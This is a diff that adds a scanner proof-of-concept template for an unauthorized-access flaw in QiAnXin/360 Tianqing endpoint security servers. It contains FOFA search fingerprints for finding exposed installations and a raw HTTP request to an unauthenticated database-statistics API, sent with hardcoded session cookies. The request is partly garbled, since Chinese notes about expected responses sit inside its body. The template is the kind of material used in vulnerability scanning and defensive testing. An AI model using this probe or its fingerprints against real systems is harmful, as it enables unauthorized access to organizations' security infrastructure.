@@ -1,0 +1,52 @@
+id: poc-nka0ulnuvoc6aiyg
+info:
+  name: 奇安信360天擎未授权访问
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nka0ulnuvoc6aiyg'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nka0ulnuvoc6aiyg
+    fofa: banner="QiAnXin web server" || banner="360 web server" || body="appid\":\"skylar6" || body="/task/index/detail?id={item.id}" || body="已过期或者未授权，购买请联系4008-136-360"
+http:
+- raw:
+  - 'GET /api/dbstat/gettablessize HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Connection: close
+
+
+    Cookie: SKYLAR4f02f2f1866fc6ba075997e842=ugop61eeb5hphts0nqcgflkjg6; YII_CSRF_TOKEN=12e76a5060de525ce3716de84c8dbd2e4e28052bs%3A40%3A%224532e70830f536e871d01d3bcc681b0b5bc5f496%22%3B
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    success
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
